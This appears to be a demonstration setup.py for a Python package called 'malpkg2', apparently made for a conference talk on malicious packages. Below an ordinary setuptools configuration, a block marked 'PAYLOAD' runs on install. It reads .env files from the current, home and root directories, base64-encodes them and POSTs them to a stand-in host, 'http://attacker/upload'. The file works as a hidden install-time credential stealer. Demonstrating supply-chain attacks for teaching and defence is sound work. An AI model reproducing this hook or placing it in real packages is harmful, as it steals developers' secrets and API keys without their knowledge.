from urllib import request, parse
import setuptools 
import base64
import json
import os 

setuptools.setup(
    name="malpkg2",
    version="0.1.0",
    author="Satria Ady Pradana",
    description="Simple package to demonstrate malicious package",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    project_urls={
        "Documentation": "https://github.com/xathrya/pycon_malpython",
        "Bug Reports":   "https://github.com/xathrya/pycon_malpython",
        "Source Code":   "https://github.com/xathrya/pycon_malpython",
    },
    python_requires=">=3.6",
)


# PAYLOAD: read environment variable
for f in [".env", os.path.expanduser("~/.env"), "/.env"]:
    if os.path.exists(f):
        with open (f, "rb") as r:
            content = base64.b64encode(r.read())
            data    = {"filename":f,"content":content.decode()}
            req     = request.Request("http://attacker/upload", data=json.dumps(data).encode(), method='POST')
            resp    = request.urlopen(req)
